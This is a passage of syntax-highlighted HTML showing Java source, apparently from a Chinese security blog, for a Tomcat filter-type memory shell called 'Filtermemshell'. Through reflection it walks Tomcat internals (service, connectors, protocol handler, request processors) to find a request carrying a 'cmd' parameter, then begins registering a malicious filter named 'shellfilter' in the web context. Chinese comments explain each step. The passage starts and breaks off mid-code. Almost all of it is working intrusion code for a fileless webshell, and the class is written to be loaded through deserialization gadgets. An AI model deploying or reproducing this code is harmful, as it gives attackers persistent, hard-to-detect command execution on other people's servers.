#F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ApplicationFilterConfig</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">StandardContext</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">core</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">StandardService</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">loader</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">WebappClassLoaderBase</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">coyote</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">AbstractProtocol</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">coyote</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Request</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">coyote</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestGroupInfo</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">coyote</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">RequestInfo</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">tomcat</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">descriptor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">FilterDef</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">tomcat</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">descriptor</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">web</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">FilterMap</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">tomcat</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">net</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">AbstractEndpoint</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">javax</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">servlet</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">*</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">IOException</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">InputStream</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">io</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">PrintWriter</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #F97583\">import</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">util</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #F97583\">public</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">class</span><span style=\"color: #B392F0\"> Filtermemshell </span><span style=\"color: #F97583\">extends</span><span style=\"color: #B392F0\"> AbstractTranslet </span><span style=\"color: #F97583\">implements</span><span style=\"color: #B392F0\"> Filter &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">    </span><span style=\"color: #F97583\">static</span><span style=\"color: #B392F0\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #6B737C\">//定个全局变量给request</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Request</span><span style=\"color: #B392F0\"> currentreq</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">null</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">        </span><span style=\"color: #F97583\">try</span><span style=\"color: #B392F0\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//首先获取StandardService</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">WebappClassLoaderBase</span><span style=\"color: #B392F0\"> webappClassLoaderBase </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (WebappClassLoaderBase) </span><span style=\"color: #79B8FF\">Thread</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">currentThread()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContextClassLoader();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> webappclassLoaderBaseField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;resources&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">webappclassLoaderBaseField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">WebResourceRoot</span><span style=\"color: #B392F0\"> resources</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(WebResourceRoot) </span><span style=\"color: #79B8FF\">webappclassLoaderBaseField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(webappClassLoaderBase);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Context</span><span style=\"color: #B392F0\"> Context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">  </span><span style=\"color: #79B8FF\">resources</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getContext();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> context </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.StandardContext&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\"> applicationContext</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ApplicationContext) </span><span style=\"color: #79B8FF\">context</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(Context);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> standardServiceField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;service&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardServiceField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">StandardService</span><span style=\"color: #B392F0\"> standardService</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(StandardService) </span><span style=\"color: #79B8FF\">standardServiceField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(applicationContext);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//获取Connctor</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> connectorsField </span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.catalina.core.StandardService&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;connectors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">connectorsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">[] connectors</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\">[])</span><span style=\"color: #79B8FF\">connectorsField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(standardService);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #6B737C\">//循环遍历Connectors</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">for</span><span style=\"color: #B392F0\">(</span><span style=\"color: #F97583\">Connector</span><span style=\"color: #B392F0\"> connector</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> connectors ) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #6B737C\">//当前去访问请求肯定是Http协议，所以我当前线程生成的connector内置的协议肯定是http</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getScheme()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;http&quot;</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//从Connector中获取到AbstractProtocol对象，实际上现在这个实例是Http11NioProtocol,由于我们获取到的是整个Connectors，也就是说不同的协议存在不同的Connector完成功能的实现，我们这里肯定需要的是Http协议的Connector</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">AbstractProtocol</span><span style=\"color: #B392F0\"> abstractProtocol</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(AbstractProtocol) </span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getProtocolHandler();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//通过Http11NioProtocol（继承于AbstractProtocol）开始获取ConnectionHandler</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Method</span><span style=\"color: #B392F0\"> getHandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.AbstractProtocol&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredMethod(</span><span style=\"color: #FFAB70\">&quot;getHandler&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">getHandler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">AbstractEndpoint</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Handler</span><span style=\"color: #B392F0\"> connectionhandler </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">AbstractEndpoint</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Handler</span><span style=\"color: #B392F0\">) </span><span style=\"color: #79B8FF\">getHandler</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">invoke(abstractProtocol);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//开始获取connectionhandler中的global属性</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> globalField </span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;global&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">globalField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">RequestGroupInfo</span><span style=\"color: #B392F0\"> global</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(RequestGroupInfo) </span><span style=\"color: #79B8FF\">globalField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(connectionhandler);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #6B737C\">//global的作用就是用来缓存Processor的，因此它里面其实存储着很多Request请求的封装，具体的RequestInfo都是类似Http11Processor这种第二次封装进来的，我们还得判断出我们想要的那个RequestInfo</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> processorField</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.RequestGroupInfo&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;processors&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #79B8FF\">processorField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">ArrayList</span><span style=\"color: #B392F0\"> processors</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ArrayList) </span><span style=\"color: #79B8FF\">processorField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(global);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    </span><span style=\"color: #F97583\">for</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #F97583\">Object</span><span style=\"color: #B392F0\"> processor</span><span style=\"color: #F97583\">:</span><span style=\"color: #B392F0\"> processors)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">RequestInfo</span><span style=\"color: #B392F0\"> requestInfo </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(RequestInfo) processor;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #6B737C\">//这个判断条件就比较的灵活了，看各自当时去访问Memshell时路径的特点（就比如说我们注入了一个filter内存马，用cmd启动，那么就获取到当前请求的cmd参数时，判断为我们的内存马访问请求）</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        </span><span style=\"color: #F97583\">if</span><span style=\"color: #B392F0\"> (</span><span style=\"color: #79B8FF\">requestInfo</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getCurrentQueryString()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">contains(</span><span style=\"color: #FFAB70\">&quot;cmd&quot;</span><span style=\"color: #B392F0\">))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> reqfield</span><span style=\"color: #F97583\">=</span><span style=\"color: #79B8FF\">Class</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">forName(</span><span style=\"color: #FFAB70\">&quot;org.apache.coyote.RequestInfo&quot;</span><span style=\"color: #B392F0\">)</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;req&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #79B8FF\">reqfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">Request</span><span style=\"color: #B392F0\"> request</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(Request) </span><span style=\"color: #79B8FF\">reqfield</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(requestInfo);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            currentreq</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(</span><span style=\"color: #79B8FF\">org</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">apache</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">catalina</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">connector</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #79B8FF\">Request</span><span style=\"color: #B392F0\">) </span><span style=\"color: #79B8FF\">request</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getNote(</span><span style=\"color: #F8F8F8\">1</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                            </span><span style=\"color: #F97583\">break</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                        &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ServletContext</span><span style=\"color: #B392F0\"> servletContext</span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\">(ServletContext) </span><span style=\"color: #79B8FF\">currentreq</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getServletContext();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> appContextField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">servletContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">appContextField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">ApplicationContext</span><span style=\"color: #B392F0\"> applicationContext2 </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (ApplicationContext) </span><span style=\"color: #79B8FF\">appContextField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(servletContext);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">java</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">lang</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">reflect</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #F97583\">Field</span><span style=\"color: #B392F0\"> standardContextField </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #79B8FF\">applicationContext</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getClass()</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">getDeclaredField(</span><span style=\"color: #FFAB70\">&quot;context&quot;</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">standardContextField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setAccessible(</span><span style=\"color: #79B8FF\">true</span><span style=\"color: #B392F0\">);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">StandardContext</span><span style=\"color: #B392F0\"> standardContext </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> (StandardContext) </span><span style=\"color: #79B8FF\">standardContextField</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">get(applicationContext2);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">Filtermemshell</span><span style=\"color: #B392F0\"> filter</span><span style=\"color: #F97583\">=new</span><span style=\"color: #B392F0\"> Filtermemshell();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">String</span><span style=\"color: #B392F0\"> name</span><span style=\"color: #F97583\">=</span><span style=\"color: #FFAB70\">&quot;shellfilter&quot;</span><span style=\"color: #B392F0\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #F97583\">FilterDef</span><span style=\"color: #B392F0\"> filterDef </span><span style=\"color: #F97583\">=</span><span style=\"color: #B392F0\"> </span><span style=\"color: #F97583\">new</span><span style=\"color: #B392F0\"> FilterDef();</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterDef</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setFilter(filter);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterDef</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: #B392F0\">setFilterName(name);</span></span>\n<span class=\"line\"><span style=\"color: #B392F0\">            </span><span style=\"color: #79B8FF\">filterDef</span><span style=\"color: #BBBBBB\">.</span><span style=\"color: 